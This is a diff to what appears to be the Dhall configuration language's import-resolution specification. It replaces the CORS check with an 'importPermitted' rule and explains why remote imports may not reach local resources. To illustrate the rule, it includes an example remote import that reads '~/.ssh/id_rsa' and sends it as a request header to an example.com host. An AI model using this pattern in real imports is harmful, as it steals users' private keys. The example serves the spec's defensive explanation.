@@ -379,16 +379,59 @@ Path components after parsing and in the binary encoding are always unescaped
 To import a URL, percent-encode each path component according to
 [RFC 3986 - Section 2](https://tools.ietf.org/html/rfc3986#section-2).
 
-## CORS
+## Import permissions
 
-To protect against server-side request forging, Dhall rejects certain transitive
-remote imports that are not CORS-enabled.  These remote imports
-must return an `Access-Control-Allow-Origin` header that matches their parent
-import.
+For security and understandability reasons, there are some types of imports
+which are not permitted.  For example, a remote import is not allowed to in turn
+read an environment variable from your machine; nor is a remote import allowed
+to crawl a private URL such as `http://localhost` or a corporate intranet.
 
-CORS compliance is denoted by the following judgment:
+There are two broad reasons for this.  The first is understandability: a Dhall
+expression fetched from a remote server should have the same behaviour,
+regardless of who is fetching it or where it is being evaluated.  This can be
+thought of as a form of referential transparency: it should always be safe to
+replace a remote import with its fully-normalized content, and if a remote
+import depends on environment-specific resources such as local configuration
+files or environment variables, this safety would be broken.
 
-    corsCompliant(parent, child, headers)
+The second reason is security: a remote import in control of a malicious third
+party which can access local, non-public resources may be able to exfiltrate
+sensitive data.  For example, this check prevents the following malicious
+import:
+
+
+    {- This file is hosted at `https://example.com/bad` and attempts to steal a
+       sensitive file from the user's system using the language's support for
+       custom headers
+    -}
+    https://example.com/recordHeaders using ./headers
+
+... which in turn tries to import this file:
+
+    {- This file is hosted at `https://example.com/headers` and attempts to
+       read in the contents of the user's private key
+
+       This import would be rejected because its canonical path is:
+
+           https://example.com/headers
+
+       ... whereas the canonical path of the private key is:
+
+           ~/.ssh/id_rsa
+
+       ... and the following `importPermitted` judgment is not valid:
+
+           importPermitted(https://example.com/headers, ~ .ssh/id_rsa, {})
+
+       ... because the referentially transparent remote import is trying to
+       access a referentially opaque local import.
+    -}
+    [ { header = "Private Key", value = ~/.ssh/id_rsa as Text } ]
+
+
+Import permissions are controlled via a judgment of the form:
+
+    importPermitted(parent, child, headers)
 
 ... where
 
@@ -403,36 +446,42 @@ CORS compliance is denoted by the following judgment:
 
 There is no output: either the judgment matches or it does not.
 
-If the `parent` is not a remote import, then the `corsCompliant` judgment
+If the `parent` is not a remote import, then the `importPermitted` judgment
 passes:
 
 
     ────────────────────────────────────────
-    corsCompliant(path file, child, headers)
+    importPermitted(path file, child, headers)
 
 
     ──────────────────────────────────────────
-    corsCompliant(. path file, child, headers)
+    importPermitted(. path file, child, headers)
 
 
     ───────────────────────────────────────────
-    corsCompliant(.. path file, child, headers)
+    importPermitted(.. path file, child, headers)
 
 
     ──────────────────────────────────────────
-    corsCompliant(~ path file, child, headers)
+    importPermitted(~ path file, child, headers)
 
 
     ────────────────────────────────────
-    corsCompliant(env:x, child, headers)
+    importPermitted(env:x, child, headers)
+
+
+Remote imports are only allowed to permit other remote imports; however, to
+protect against server-side request forging, Dhall rejects certain transitive
+remote imports that are not CORS-enabled.  These remote imports must return an
+`Access-Control-Allow-Origin` header that matches their parent import.
 
 
 If the `parent` and `child` import share the same origin, then the judgment also
 passes:
 
 
-    ──────────────────────────────────────────────────────────────────────────────────────────────
-    corsCompliant(https://authority directory₀ file₀, https://authority directory₁ file₁, headers)
+    ────────────────────────────────────────────────────────────────────────────────────────────────
+    importPermitted(https://authority directory₀ file₀, https://authority directory₁ file₁, headers)
 
 
 However, if the parent import is a remote import and the child import has a
@@ -443,12 +492,12 @@ import or `*`:
 
     headers("Access-Control-Allow-Origin") = [ "*" ]
     ────────────────────────────────────────────────
-    corsCompliant(parent, child, headers)
+    importPermitted(parent, child, headers)
 
 
     headers("Access-Control-Allow-Origin") = [ "https://authority" ]
-    ────────────────────────────────────────────────────────────────
-    corsCompliant(https://authority directory file, child, headers)
+    ─────────────────────────────────────────────────────────────────
+    importPermitted(https://authority directory file, child, headers)
 
 
 If the `Access-Control-Allow-Origin` header does not match the scheme and
@@ -456,8 +505,15 @@ authority then the transitive remote import is rejected.  If there is not
 exactly one value for the `Access-Control-Allow-Origin` header then the
 transitive remote import is also rejected.
 
-Note well that there is no inference rule that allows a remote parent
-requesting a local child to be corsCompliant().
+Note well that there is no inference rule that allows a remote parent requesting
+a local child to be importPermitted().
+
+## Fetching judgment
+
+Fetching a resource as code is captured by a judgment of the form:
+
+    fetchCode(origin, import, , responseHeaders)
+
 
 ## Import resolution judgment
 
@@ -479,6 +535,9 @@ Import resolution is a function of the following form:
 * `Γ₀` (an input) is an unordered map from imports to expressions representing
   the state of the filesystem/environment/web before the import
     * `Γ₀(import)` means to retrieve the expression located at `import`
+    * Note that if a remote import fetches another remote import at a
+      different origin, the `Origin` header must be set on this
+      request
 * `e₀` (an input) is the expression to resolve
 * `e₁` (an output) is the import-free resolved expression
 * `Γ₁` (an output) is an unordered map from imports to expressions representing
@@ -495,10 +554,10 @@ resolve imports within the retrieved expression:
     Γ(child) = e₀ using responseHeaders     ; Retrieve the expression, possibly
                                             ; binding any response headers to
                                             ; `responseHeaders` if child was a
-                                            ; remote import
-    corsCompliant(parent, responseHeaders)  ; If `child` was not a remote import
-                                            ; and therefore had no response
-                                            ; headers then skip this CORS check
+                                            ; remote import; otherwise, bind
+                                            ; `responseHeaders` to the empty
+                                            ; list of headers
+    importPermitted(parent, child, responseHeaders)
     (Δ, parent, child) × Γ₀ ⊢ e₀ ⇒ e₁ ⊢ Γ₁
     ε ⊢ e₁ : T
     ────────────────────────────────────  ; * child ∉ (Δ, parent)
@@ -519,7 +578,7 @@ If an import ends with `as Text`, import the raw contents of the file as a
     parent </> import₀ = import₁
     canonicalize(import₁) = child
     Γ(child) = "s" using responseHeaders  ; Read the raw contents of the file
-    corsCompliant(parent, responseHeaders)
+    importPermitted(parent, child, responseHeaders)
     ───────────────────────────────────────────
     (Δ, parent) × Γ ⊢ import₀ as Text ⇒ "s" ⊢ Γ
 
@@ -534,7 +593,7 @@ the resolved expression as additional headers supplied to the HTTP request:
     parent </> import₀ = import₁
     canonicalize(import₁) = child
     Γ₁(https://authority directory file using requestHeaders) = e₀ using responseHeaders ; Append requestHeaders to the request's headers
-    corsCompliant(parent, responseHeaders)
+    importPermitted(parent, child, responseHeaders)
     (Δ, parent, child) × Γ₁ ⊢ e₀ ⇒ e₁ ⊢ Γ₂
     ε ⊢ e₁ : T
     ──────────────────────────────────────────────────────────────────────────  ; * child ∉ Δ
